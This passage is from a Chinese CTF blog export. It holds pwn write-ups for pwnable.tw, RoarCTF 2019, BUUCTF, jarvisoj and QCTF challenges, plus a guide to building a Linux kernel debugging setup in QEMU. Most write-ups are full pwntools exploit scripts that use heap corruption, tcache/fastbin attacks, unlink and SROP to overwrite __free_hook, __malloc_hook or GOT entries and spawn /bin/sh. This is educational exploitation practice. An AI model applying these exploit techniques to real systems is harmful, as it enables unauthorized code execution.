p.sendafter("Data:", content)def free(idx): p.sendlineafter("choice: ", '3') p.sendlineafter("Index:", str(idx))def exp(): try: global p #p = process(prog) p = remote('chall.pwnable.tw', 10310) alloc(0, 0x40) alloc(1, 0x40) free(0) realloc(1, 0) realloc(1, 0x40 ,'\x10\x60') alloc(0, 0x40) realloc(0, 0x50) free(0) alloc(0, 0x40, '\xff'*4+'\x00'*2+'\xff'*(0x40-6)) realloc(0, 0x50) realloc(1, 0x70) free(1) alloc(1, 0x30) free(0) realloc(1, 0x30, 'a'*8+'\x58\x47') alloc(0, 0x60, '/bin/sh\x00'+p64(0xfbad1800)+p64(0)*3) p.recv(8) libc.address = u64(p.recv(6)+'\x00'*2)-0x7ffff7fc7570+0x7ffff7de0000 log.info("libc.address ==&gt; " + hex(libc.address)) if libc.address &amp; 0xff != 0: p.close() return False realloc(1, 0x30, 'a'*8+p64(libc.sym['__free_hook'])) free(1) alloc(1, 0x60, p64(libc.sym['system'])) free(0) except: p.close() return False p.interactive()if __name__ == '__main__': while not exp(): pass 总共爆破了两字节，（实际上我很快就成功了，运气不错，不知道是不是因为这两个字节有什么联系，但肯定不是一一对应）]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux kernel环境搭建]]></title>
    <url>%2F2020%2F01%2F29%2Flinux-kernel%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[好久没更新博客了，很大原因是因为网上有太多大师傅总结的都比较好，自己又太菜，能写出来的干货太少了。希望利用这个假期来学习一下linux kernel相关 内核编译安装所需要的依赖： 12sudo apt-get updatesudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc 安装qemu及其依赖： 12$ sudo apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev$ sudo apt-get install qemu 下载kernel源代码，我这里选择了linux-4.4.73版本 1234wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.73.tar.gztar -zxvf linux-4.4.73.tar.gzcd linux-4.4.73make menuconfig 在可选菜单里默认选项即可，直接保存，然后 1make bzImage 需要等待一段时间去编译，看到如下信息，基本就算是编译完成了在./arch/x86/boot/可以找到bzImage，从源码根目录找到vmlinux。ps:bzImage（Big zImage）是vmlinuz经过gzip压缩后的文件，适用于大内核vmlinux是未压缩的内核，是一个非压缩的，静态链接的，可执行的，不能bootable的Linux kernel文件。是用来生成vmlinuz的中间步骤。vmlinuz是vmlinux的压缩文件，是一个压缩的，能bootable的Linux kernel文件。vmlinuz是Linux kernel文件的历史名字，它实际上就是zImage或bzImagevmlinux 是ELF文件，即编译出来的最原始的文件。vmlinuz应该是由ELF文件vmlinux经过OBJCOPY后，并经过压缩后的文件zImage是vmlinuz经过gzip压缩后的文件，适用于小内核 添加syscall其实这部分内容在上学期的操作系统实验与课设中有过相关的学习和操作，只不过用的是linux0.11在内核源代码根目录下创建helloworld目录，并创建两个文件helloworld.c和Makefilehelloworld.c: 123456#include &lt;linux/kernel.h&gt;asmlinkage long sys_helloworld(void)&#123; printk("&#123;==kernel==&#125; hello world\n"); return 0;&#125; Makefile： 1obj-y=helloworld.o 然后返回根目录，编辑Makefile，添加helloworld/然后在include/linux/syscalls.h，添加函数原型 1asmlinkage long sys_helloworld(void); 编辑arch/x86/entry/syscalls/syscall_32,添加 11111 i386 helloworld sys_helloworld 编辑arch/x86/entry/syscalls/syscall_64,添加 11111 common helloworld sys_helloworld 注意这个要加在这行的上面 1# x32-specific system call numbers start at 512 to avoid cache impact 然后make bzImage编译内核 编译busybox根据维基上的定义：BusyBox是一个遵循GPL协议、以自由软件形式发行的应用程序。Busybox在单一的可执行文件中提供了精简的Unix工具集，可运行于多款POSIX环境的操作系统，例如Linux（包括Android[6]）、Hurd[7]、FreeBSD[8][9]等等。由于BusyBox可执行文件的文件大小比较小，使得它非常适合使用于嵌入式系统。作者将BusyBox称为“嵌入式Linux的瑞士军刀”busybox可在官网下载：https://busybox.net/将下载文件解压后，进入目录下 1make menuconfig 在setting里将Build static binary (no shared libs)勾选，然后执行编译 1make install -j4 然后进行相关的初始化工作 12345cd _installmkdir procmkdir systouch initchmod +x init 在init文件中写入下面内容： 123456789101112#!/bin/shecho &quot;&#123;==DBG==&#125; INIT SCRIPT&quot;mkdir /tmpmount -t proc none /procmount -t sysfs none /sysmount -t debugfs none /sys/kernel/debugmount -t tmpfs none /tmp# insmod /xxx.ko # load komdev -s # We need this to find /dev/sda laterecho -e &quot;&#123;==DBG==&#125; Boot took $(cut -d&apos; &apos; -f1 /proc/uptime) seconds&quot;setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user# exec /bin/sh #root init作用是内核初始化，insmod作用于将指定模块加载到内核中然后可以写一个如下脚本用来打包rootfs 1234#!/bin/shecho &quot;Generate rootfs.img&quot;cd busybox # fs folderfind . | cpio -o --format=newc &gt; ../rootfs.img 编译ko文件在内核源代码根目录下，创建ko目录编辑hello.c和Makefile文件hello.c: 123456789101112131415161718#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/cred.h&gt;MODULE_LICENSE("Dual BSD/GPL");struct cred c1;static int hello_init(void) &#123; printk("&lt;1&gt; Hello world!\n"); printk("size of cred : %d \n",sizeof(c1)); return 0;&#125;static void hello_exit(void) &#123; printk("&lt;1&gt; Bye, cruel world\n");&#125;module_init(hello_init);module_exit(hello_exit); Makefile： 1234567891011121314obj-m := hello.oKERNELDR := /home/focu5/linux-4.4.72PWD := $(shell pwd) modules: $(MAKE) -C $(KERNELDR) M=$(PWD) modules moduels_install: $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install clean: rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions 然后执行make编译hello.ko文件，并放到busybox的_install目录下 运行写一个程序来调用syscall，注意用静态编译 1234567//gcc test.c -static -o test#include &lt;unistd.h&gt;int main(void)&#123; syscall(1111); return 0;&#125; 将FileSystem打包成映像（此时应该将刚才编辑的init中xxx.ko改为刚才我们生成的hello.ko)执行find . | cpio -o --format=newc &gt; ./rootfs.img将生成的rootfs.img和编译的内核bzImage文件放在同一文件夹下，新建一个启动脚本boot.sh 123456789101112#!/bin/shqemu-system-x86_64 \-m 64M \-kernel ./bzImage \-initrd ./rootfs.img \-append &quot;root=/dev/ram rw oops=panic panic=1 kalsr&quot; \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-monitor /dev/null \-smp cores=2,threads=1 \-cpu kvm64,+smep \#-S 启动gdb调试#-gdb tcp:1234 等待gdb调试 ./boot.sh运行即可]]></content>
      <tags>
        <tag>linux kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Roarctf-2019]]></title>
    <url>%2F2019%2F10%2F17%2FRoarctf-2019%2F</url>
    <content type="text"><![CDATA[easy_pwn程序存在off by one可以借此进行chunk overlap，我采用了向上合并的方式，首先申请一个unsorted chunk0并free掉，中间申请一个可以off by one的unsorted chunk1，再申请一个unsorted chunk2，利用中间的chunk更改下一个chunk的size位尽量包含多个chunk， 然后当再次申请chunk0_size,可以使得main_arena在chunk1的fd位，show(1)可计算得到libc基址，然后add(chunk1_size),可以获得一个由两个指针同时指向的chunk1，可以劫持malloc_hook，注意的是再写one_gadget需要利用realloc平衡栈结构来执行execve(‘/bin/sh’,0,0) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *context.log_level="debug"libc = ELF("./libc-2.23.so")p = process("./easy_pwn")#p = remote("39.97.182.233", 41078)def add(size): p.sendlineafter(": ", "1") p.sendlineafter(": ", str(size))def edit(idx, size, content): p.sendlineafter(": ", "2") p.sendlineafter(": ", str(idx)) p.sendlineafter(": ", str(size)) p.sendafter(": ", content)def free(idx): p.sendlineafter(": ","3") p.sendlineafter(": ", str(idx))def show(idx): p.sendlineafter(": ", "4") p.sendlineafter(": ", str(idx))def dbg(): gdb.attach(p) p.interactive()def exp(): add(0x80)#0 add(0x68)#1 add(0x80)#2 add(0x20)#3 add(0x20)#4 free(0) edit(1, 0x68+10, '\x00'*0x60+p64(0x100)+'\xc0') free(2) add(0x80)#0 show(1) libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00'*2)-0x3c4b78 log.success("libc_base == &gt; " + hex(libc_base)) malloc_hook = libc_base + libc.sym['__malloc_hook']-0x23 realloc = libc_base + libc.sym['realloc'] add(0x68)#2 free(2) edit(1, 8, p64(malloc_hook)) add(0x68) add(0x68) edit(5, 0x18+3, 'aaa'+p64(0)+p64(libc_base+0xf1147)+p64(realloc+4)) #dbg() p.interactive()if __name__ == '__main__': exp() PS：看了其他师傅的wp，是用unsorted attack在free_hook上写出一个0x7f开头的数据来写free_hook为system realloc_magic没有输出函数且开启PIE，需要利用unsorted chunk踩出_IO_2_1_stdout_高位地址，然后1/16爆破其第低三位，修改_IO_write_base和flags泄露出libc基址。利用realloc的特性和uaf，overlap chunk，关键点是程序只有一次重置指针的机会，需要在改完IO FILE时使用，所以前面进行tcache attack时，修改其size位，使其下次free后进入其他size的tcache bins，不然因为tcache bin的后进先出永远申请不到目标位置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context.log_level = 'debug'elf = ELF("./roarctf_2019_realloc_magic")#p = elf.process()libc = ELF("./libc-2.27.so")def dbg(): gdb.attach(p) p.interactive()def re(size, content): p.sendlineafter("&gt;&gt; ", '1') p.sendlineafter("Size?", str(size)) p.sendafter("Content?", content)def fr(): p.sendlineafter("&gt;&gt; ", '2')def ba(): p.sendlineafter("&gt;&gt; ", '666')def exp(): global p p = remote("node3.buuoj.cn", 28467) re(0x80, 'a') re(0, '') re(0x90, 'b') re(0, '') re(0x20, 'b') re(0, '') re(0x90, 'a') for i in range(7): fr() re(0, '') re(0x80, 'a') re(0x110, '\x00'*0x88 + p64(0x51)+'\x60\xf7') re(0, '') re(0x90, 'a') re(0, '') try: re(0x90, p64(0xfbad1800)+p64(0)*3+'\x00') except: log.failure("not lucky enough!") p.close() return False libc_base = u64(p.recvuntil("\x7f", timeout=0.5)[-6:].ljust(8,'\x00'))-0x3ed8b0 if libc_base&amp;0xFF!=0x00: log.failure("not lucky enough!") p.close() return False log.success('libc_base ==&gt; ' + hex(libc_base)) ba() re(0x120, '\x00'*0x88+p64(0x61)+p64(libc_base+libc.sym['__free_hook'])) re(0, '') re(0x40, 'a') re(0, '') re(0x40, p64(libc_base+libc.sym['system'])) re(0, '') re(0x20, '/bin/sh\x00') fr() p.interactive()while not exp(): passif __name__ == '__main__': exp()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记录一下在buuctf刷的几个pwn题]]></title>
    <url>%2F2019%2F09%2F13%2Fbuuctf-pwn%2F</url>
    <content type="text"><![CDATA[babyheap_0ctf_2017申请几个fast chunk和一个unsorted chunk, 释放两个fast chunk，改变第一个chunk的fd值为unsorted chunk地址，且需要将其size位改为0x21，为的是过掉检测： 1234567if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))&#123; errstr = "malloc(): memory corruption (fast)";errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL;&#125; 查看其 chunksize 与相应的 fastbin_index 是否匹配，实际上 chunksize 的计算方法是 victim-&gt;size &amp; ~(SIZE_BITS))，而它对应的 index 计算方法为 (size) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3) - 2，这里 64位的平台对应的 SIZE_SZ 是8，则 fastbin_index 为 (size &gt;&gt; 4) - 2，那么我们将 small chunk 的 size 域改写成 0x21 即可。两次alloc申请到unsorted chunk，使得第二个指针也指向他，此时再将他的size改回来，free掉即可通过show(1)来leak libc babyfengshui_33c3_2016参照https://firmianay.gitbooks.io/ctf-all-in-one/doc/6.1.20_pwn_33c3ctf2016_babyfengshui.html题目主要是通过(store[i]-&gt;desc + test_size) &lt; (store[i] - 4)来检测堆溢出，那么可以通过先创建两个user，free掉第一个，使其description和name合并为一个unsorted chunk，再申请一个大小为合并后chunk的大小的description，此时即可绕过检测进行堆溢出然后就是经典操作将user2的description改为free_got，泄露libc基址，在修改指针，使得free_got为system，构造chunk即可执行system(“/bin/sh”)exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *context.log_level = 'debug'#p = process('./babyfeng')elf = ELF("./babyfeng")p = remote('pwn.buuoj.cn', 20002)libc = ELF("./x86_libc.so.6")#libc = ELF("./libc-2.23.so")if args.G: gdb.attach(p)def add(nsize, name, dsize, des): p.recvuntil("Action: ") p.sendline("0") p.recvuntil("description: ") p.sendline(str(nsize)) p.recvuntil("name: ") p.sendline(name) p.recvuntil("text length: ") p.sendline(str(dsize)) p.recvuntil("text: ") p.sendline(des)def free(idx): p.recvuntil("Action: ") p.sendline("1") p.recvuntil("index: ") p.sendline(str(idx))def show(idx): p.recvuntil("Action: ") p.sendline("2") p.recvuntil("index: ") p.sendline(str(idx))def edit(idx, size, text): p.recvuntil("Action: ") p.sendline("3") p.recvuntil("index: ") p.sendline(str(idx)) p.recvuntil("text length: ") p.sendline(str(size)) p.recvuntil("text: ") p.sendline(text)def exp(): add(0x80,'a',0x80,'a') add(0x80, 'b', 0x80, 'b') add(0x10, '/bin/sh\x00', 0x10, '/bin/sh\x00') free(0) add(0x100, 'a', 0x19c, 'a'*0x198 + p32(elf.got['free'])) show(1) p.recvuntil("description: ") free_addr = u32(p.recv(4)) log.success("free_addr isa " + hex(free_addr)) libc_base = free_addr - libc.sym['free'] system_addr = libc_base + libc.sym['system'] edit(1, 4, p32(system_addr)) log.success("system_addr is " + hex(system_addr)) log.success("libc_base is " + hex(libc_base)) free(2) p.interactive()if __name__ == '__main__': exp() ciscn_final_3难点在于leak libc环境为libc.2.27含tcache，无法申请到unsorted chunk，先通过gift得到第一块的堆地址，然后利用tcache attack double free到第一块，修改size利用堆重叠使其进入unsorted bin分割chunk至tcache chunk使其fd指向main_arena附近，再次申请chunk通过gift，即可leak libc ez_pz_hackover_2016‘\x00’过掉strlen，ret2libc 123456789101112131415161718192021222324from pwn import *context.log_level = 'debug'#p = process("./ez_pz_hackover_2016")p = remote("pwn.buuoj.cn", 20040)elf = ELF("./ez_pz_hackover_2016")libc = ELF("x86_libc.so.6")if args.G: gdb.attach(p)chall = 0x8048603p.recvuntil("&gt; ")payload = 'crashme\x00' + 'a' * (0x32-8-0x14-4) + p32(elf.plt['printf']) + p32(chall) + p32(elf.got['printf'])p.sendline(payload)p.recvline_startswith('Welcome')printf_addr = u32(p.recv(4))log.success("printf_addr ==&gt; " + hex(printf_addr))libc_base = printf_addr - libc.sym['printf']log.success("libc_base ==&gt; " + hex(libc_base))system_addr = libc.sym['system'] + libc_basebinsh_addr = libc.search("/bin/sh").next() + libc_basepayload = 'crashme\x00' + 'a' * (0x32-8-0x14-4) + p32(system_addr) + p32(0) + p32(binsh_addr)p.sendline(payload)p.interactive() ciscn_2019_en_3123456789101112131415161718192021222324252627282930313233343536373839from pwn import *context.log_level = 'debug'elf = ELF("./ciscn_2019_en_3")p = elf.process()libc = ELF("./libc-2.27.so")#p = remote("")def dbg(): gdb.attach(p) p.interactive()def add(size, content): p.sendlineafter("choice:", '1') p.sendlineafter("of story: \n", str(size)) p.sendafter("the story: \n", content) def free(idx): p.sendlineafter("choice:", '4') p.sendlineafter("index:\n", str(idx))def exp(): p.sendlineafter("name?\n", 'a') p.sendafter("ID.\n", 'a'*8)#利用read后面不补0的特性，泄露栈上数据，leak libc libc_base = u64(p.recvuntil('\x7f')[-6:]+'\x00'*2) - 0x81237 log.success("libc_base ==&gt; " + hex(libc_base)) free_hook = libc_base + libc.sym['__free_hook'] system = libc_base + libc.sym['system'] binsh = libc_base + libc.search('/bin/sh').next() add(0x20,'a')#0 add(0x20,'/bin/sh\x00')#1 free(0) #double free free(0) add(0x20, p64(free_hook)) add(0x20,'a') add(0x20, p64(system)) free(1) p.interactive()if __name__ == '__main__': exp() ciscn_2019_es_1libc-2.27 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *context.log_level = 'debug'elf = ELF("./ciscn_2019_es_1")p = elf.process()libc = ELF("./libc-2.27.so")#p = remote("")def dbg(): gdb.attach(p) p.interactive()def add(size, name, call): p.sendlineafter("choice:", '1') p.sendlineafter("compary's name\n", str(size)) p.sendafter("name:\n", name) p.sendlineafter("call:\n", call)def show(idx): p.sendlineafter("choice:", '2') p.sendlineafter("index:\n", str(idx))def free(idx): p.sendlineafter("choice:", '3') p.sendlineafter("index:\n", str(idx))def exp(): for i in range(9): add(0x80, '/bin/sh', 'call') for i in range(8): free(i) show(7) libc_base = u64(p.recvuntil("\x7f")[-6:]+'\x00\x00')-0x3ebca0 log.success("libc_base ==&gt; " + hex(libc_base)) free_hook = libc_base + libc.sym['__free_hook'] system = libc_base + libc.sym['system'] add(0x20, 'a', 'a') free(9) free(9) add(0x20, p64(free_hook), 'a') add(0x20, 'a', 'a') add(0x20, p64(system), 'a') free(8) p.interactive()if __name__ == '__main__': exp() libc-2.23 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *context.log_level = 'debug'elf = ELF("./ciscn_2019_es_1")p = elf.process()libc = ELF("./libc-2.23.so")#p = remote("")def dbg(): gdb.attach(p) p.interactive()def add(size, name, call): p.sendlineafter("choice:", '1') p.sendlineafter("compary's name\n", str(size)) p.sendafter("name:\n", name) p.sendlineafter("call:\n", call)def show(idx): p.sendlineafter("choice:", '2') p.sendlineafter("index:\n", str(idx))def free(idx): p.sendlineafter("choice:", '3') p.sendlineafter("index:\n", str(idx))def exp(): add(0x80, 'a', 'a')#0 add(0x20, 'b', 'b')#1 free(0) show(0) libc_base = u64(p.recvuntil("\x7f")[-6:]+'\x00\x00')-0x3c4b78 log.success("libc_base ==&gt; " + hex(libc_base)) malloc_hook = libc_base + libc.sym['__malloc_hook'] realloc = libc_base + libc.sym['realloc'] system = libc_base + libc.sym['system'] one =libc_base + 0x4526a add(0x60, 'a', 'a')#2 add(0x60, 'b', 'b')#3 free(2) free(3) free(2) add(0x60, p64(malloc_hook-0x23), 'a') add(0x60, 'a','a') add(0x60, 'a', 'a') add(0x60, '\x00'*11+p64(one)+p64(realloc+0x10), 'b') dbg() p.interactive()if __name__ == '__main__': exp() ciscn_2019_final_2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#修改stdin_fileno为指定fd来获取flag# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p = process("ciscn_final_2")elf = ELF("ciscn_final_2")libc = ELF("./libc-2.27.so")if args.G: gdb.attach(p)def add(typ, num): p.recvuntil("&gt;") p.sendline("1") p.recvuntil("&gt;") p.sendline(str(typ)) p.recvuntil(":") p.send(str(num))def show(typ): p.recvuntil("&gt;") p.sendline("3") p.recvuntil("&gt;") p.sendline(str(typ))def free(typ): p.recvuntil("&gt;") p.sendline("2") p.recvuntil("&gt;") p.sendline(str(typ))def exp(): add(1, 0x30)#0 add(2, 0x20)#1 add(2, 0x20)#2 add(2, 0x20)#3 free(1) add(2, 0x20)#4 free(2) add(1, 0x30) free(2) show(2) p.recvuntil(":") chunk0_addr = int(p.recvline().strip()) - 0xa0 log.success("chunk0_addr ==&gt; " + hex(chunk0_addr)) add(2, chunk0_addr) add(2, 0) add(2, 0x91) for _ in range(7): free(1) add(2, 0x91) free(1) show(1) p.recvuntil(":") main_arena = int(p.recvline().strip()) -96 libc_base = main_arena - libc.sym['__malloc_hook'] - 0x10 log.success("libc_base ==&gt; " + hex(libc_base)) io_stdin = libc_base + libc.sym['_IO_2_1_stdin_'] + 0x70 add(1, io_stdin) #这道题这能写fd低位，正好利用main_arena的高位 add(1, 0x30) free(1) add(2, 0x20) free(1) show(1) p.recvuntil(":") chunk0_fd = int(p.recvline().strip()) -0x30 add(1, chunk0_fd) add(1, 0) add(1, 0) add(1, 666) p.recvuntil("&gt;") p.sendline("4") print p.recvuntil("received...\n") p.interactive() if __name__ == '__main__': exp()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈溢出进阶——srop]]></title>
    <url>%2F2019%2F09%2F13%2Fsrop%2F</url>
    <content type="text"><![CDATA[srop主要学习来源来自 ctf-wiki上的介绍：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop原理、exp和题目不想做搬运，里面都可以找到这里主要谈一下自己的心得：现附上一张图 这个是根据ctf-wiki上的exp构造的栈空间的流程，可以发现大概利用流程就是通过read读入字节数的返回值修改rax，再将sigframe结构体写入栈中，再通过read读取syscall至返回地址，拼接字节使其返回值为15，从而执行sigreturn，又因为sigframe设置rip为syscall再次调用,执行execve(‘/bin/sh’,0,0)由于直接将返回值改为syscall,会破坏rsp，无法继续read sigframe,所以采用两次读取sigframe，第一次目的是将rsp置为原址，并将返回地址main和第二个sigframe读入栈中，然后回到main执行read(0,rsp,0x400)，置rax为15，即可getshell注意：一定要加上context.arch = ‘amd64’，关系到SigreturnFrame()的内容 接下来是实战了一道例题：ciscn_2019_es_7，buuoj上有题目复现其中提供了方便利用的gadget 12345678910111213.text:00000000004004ED ; __unwind &#123;.text:00000000004004ED push rbp.text:00000000004004EE mov rbp, rsp.text:00000000004004F1 xor rax, rax.text:00000000004004F4 mov edx, 400h ; count.text:00000000004004F9 lea rsi, [rsp+buf] ; buf.text:00000000004004FE mov rdi, rax ; fd.text:0000000000400501 syscall ; LINUX - sys_read.text:0000000000400503 mov rax, 1.text:000000000040050A mov edx, 30h ; count.text:000000000040050F lea rsi, [rsp+buf] ; buf.text:0000000000400514 mov rdi, rax ; fd.text:0000000000400517 syscall ; LINUX - sys_write 1234567891011.text:00000000004004D6 gadgets proc near.text:00000000004004D6 ; __unwind &#123;.text:00000000004004D6 push rbp.text:00000000004004D7 mov rbp, rsp.text:00000000004004DA mov rax, 0Fh ;修改rax为0xf 可执行sigreturn.text:00000000004004E1 retn.text:00000000004004E1 gadgets endp ; sp-analysis failed.text:00000000004004E1.text:00000000004004E2 ; ---------------------------------------------------------------------------.text:00000000004004E2 mov rax, 3Bh ;修改rax为0x3b 可执行execve.text:00000000004004E9 retn 由于这道题不知道怎么使用execve，就直接运用sigreturn来做了主要利用过程就是先得到栈地址，由于返回地址要覆盖成read，所以只能找到一个栈空间下面的一段偏移，题目未开启pie则可以通过计算找到binsh字符串，然后就是写入sigframe，再利用给的gadget将rax设置为15即可exp如下： 12345678910111213141516171819202122232425262728293031323334from pwn import *#p = process('./ciscn_2019_es_7')p = remote('pwn.buuoj.cn', 20179)if args.G: gdb.attach(p)context.arch = 'amd64'context.log_level = 'debug'gadget = 0x4004dasyscall_ret = 0x400517read = 0x4004edpayload = 'a' * 16 + p64(read)p.send(payload)p.recvn(32)stack_addr = u64(p.recvn(6)+'\x00'*2)log.success('leak stack addr :' + hex(stack_addr))## call execv("/bin/sh",0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr - 280 # "/bin/sh" 's addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = '/bin/sh\x00' + p64(0) + p64(gadget) + p64(syscall_ret) + str(sigframe)print len(frame_payload)payload = frame_payload p.send(payload)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jarvisoj-level6_x64-实战unlink利用]]></title>
    <url>%2F2019%2F08%2F18%2Fjarvisoj-pwn-freenote-x64%2F</url>
    <content type="text"><![CDATA[这道题算是自己独立完成的第一个堆利用题，比较有纪念意义拿到题，IDA加载后分析源码，存在一个bss段信息存放着有关的堆信息，通过gdb调试发现其存放着堆信息索引的地址注意是指向索引的指针，如果是索引本身那么直接unlink到bss段即可 调试发现，索引也为一个chunk，是变化的，但可以通过leak heap计算得来heap地址泄露的原理为：当两个不相邻的chunk被free掉时，会置于bin的链表中，本例中会先放到unsorted bin中，这时chunk的fd和bk中存有chunk的地址信息首先建立五个chunk，然后free掉两个不相邻的，其中chunk0的作用用来溢出到chunk1的fd部分之前来泄露fd（chunk3地址）的内容，chunk4的作用则是chunk3被free时与top chunk合并 1234567new('a'*0x80) #0new('b'*0x80) #1new('c'*0x80) #2new('d'*0x80) #3new('e'*0x80) #4 free(3)free(1) 此时gdb调试堆情况如下通过上张调试图片可以发现chunk1的bk部分存放着main_arena+88的地址，接下来可以藉此leak libclibc地址泄露的具体原理为： 1. 由于在写入的时候没有加上\x00，所以在输出的时候可以也一直输出到之后的\x00为止。 2. 当chunk被free掉后fd和bk指针会的值为&lt;main_arena+offset&gt;，而&lt;main_arena+offset&gt;与libc加载地址的相对偏移是固定的。所以只需要泄露出&lt;main_arena+offset&gt;，再在本地调试找到算出libc和main_arena的偏移，便能知道libc的基址不同libc版本，其main_arena偏移地址可通过malloc_trim找到：接下来即可在chunk0下面伪造fake chunk使其fd为heap_head-0x18,bk为heap_head-0x10，unlink原理网上很多就不再写了，稍微总结一下unlink的理解unlink在构造fake chunk时候要绕过两个函数 12if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P, AV); 12if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr ("corrupted size vs. prev_size"); 绕过第一个函数，需要找到一个位置指向堆地址，即*P = X，通常P为一个note的索引绕过第二个函数，需要溢出到下一个chunk的prev_size位，使其等于fake chunk的size，同时size位的最低为要为0成功unlink后，P可以指向P-0x18，可以配合edit free等功能实现任意读写因为此题未开启FULL RELRO，可改变got表为system实现get shell，不然要通过写free_hook或者malloc_hook完整exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *context.log_level = 'debug'p = process("./freenote")#p = remote("pwn2.jarvisoj.com", 9886)elf = ELF('./freenote')libc = ELF('libc-2.19.so')#libc = ELF('libc.so.6')if args.G: gdb.attach(p)def new(payload): p.recvuntil("choice: ") p.sendline("2") p.recvuntil("new note: ") p.sendline(str(len(payload))) p.recvuntil("your note: ") p.send(payload)def show(): p.recvuntil("choice: ") p.sendline("1")def edit(idx, payload): p.recvuntil("choice: ") p.sendline("3") p.recvuntil("number: ") p.sendline(str(idx)) p.recvuntil("of note: ") p.sendline(str(len(payload))) p.recvuntil("your note: ") p.send(payload)def free(idx): p.recvuntil("choice: ") p.sendline("4") p.recvuntil("number: ") p.sendline(str(idx))def exp(): new('a'*0x80) #0 new('b'*0x80) #1 new('c'*0x80) #2 new('d'*0x80) #3 new('e'*0x80) #4 #leak heap free(3) free(1) edit(0, 'a'*0x90) show() p.recvn(0x93) heap_head = u64(p.recvuntil('\n', drop = True).ljust(8, '\x00')) - 0x19d0 log.success('heap_head is ' + hex(heap_head)) #leak libc edit(0, 'a'*0x98) show() p.recvn(0x93 + 0x8) main_arena = u64(p.recvn(6).ljust(8, '\x00')) log.success("main_arena is " + hex(main_arena)) libc_base = main_arena - 88 - 0x3c2760 system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + libc.search('/bin/sh').next() #unlink payload = p64(0) + p64(0x80) + p64(heap_head + 0x30 - 0x18) + p64(heap_head + 0x30 - 0x10) payload = payload.ljust(0x80, 'a') payload += p64(0x80) + p64(0x90) free(0) new(payload) free(1) payload = p64(2) + p64(1) + p64(8) + p64(elf.got['free']) + p64(0)*2 + p64(binsh_addr) payload = payload.ljust(0x90, 'a') edit(0, payload) edit(0, p64(system_addr)) free(1)exp()p.interactive() 通过这道题对堆利用的题有了初步的认识，接下来要努力学习堆内存管理的机制。PS：常见的unlink利用是通过off-by-one null byte使下一个chunk的size低位为0，然后free实现unlink]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一道pwn题学习c和python混合编程]]></title>
    <url>%2F2019%2F08%2F04%2FQCTF2018-pwn-dice-game%2F</url>
    <content type="text"><![CDATA[QCTF2018-pwn-dice_game拿到文件，首先IDA分析发现read函数，但长度限制在0x50，buf位于rbp-0x50处，且有截断，无法直接溢出到rip 发现srand函数，其通过参数seed改变系统提供的种子值，可以使得每次调用rand函数生成的伪随机数序列不同，从而实现真正意义上的“随机”此题通过rand函数生成数字，每次与输入对比，50次全部猜对即可获得flag通过查看栈上buf和seed的位置关系，发现可以通过溢出覆盖seed值但是要想利用就需要利用libc中的函数，通过查找资料发现一个可以在python中调用c语言函数库的办法，实现python和c混合编程python一个库——ctypes，使用cdll.LoadLibrary即可加载dll并取出函数完整exp如下： 123456789101112131415from pwn import *from ctypes import *libc = cdll.LoadLibrary('libc.so.6')#p = process('./dice_game')p = remote('111.198.29.45', 51234)payload = 'a' * 0x40 + p64(1)p.sendlineafter('name:', payload)for _ in range(50): num = libc.rand() % 6 + 1 p.sendlineafter('(1~6):', str(num))p.interactive() 继续学习ctypes库，学习到很多有意思的东西： 123456789i = c_int(42)print 'before, i.value =', i.valuepi = pointer(i)pi[0] = 57print 'after, i.value =', i.value # create NULL pointer, also can use this way, but recommend use 'pointer' not 'POINTER'null_ptr = POINTER(c_int)()print 'bool(null_ptr) =', bool(null_ptr) 即通过关键字pointer可以使用指针还有其他方法，参考资料：https://www.cnblogs.com/gaowengang/p/7919219.html]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-安恒19年7月赛-pwn]]></title>
    <url>%2F2019%2F07%2F30%2F2019-7-pwn-unexploit%2F</url>
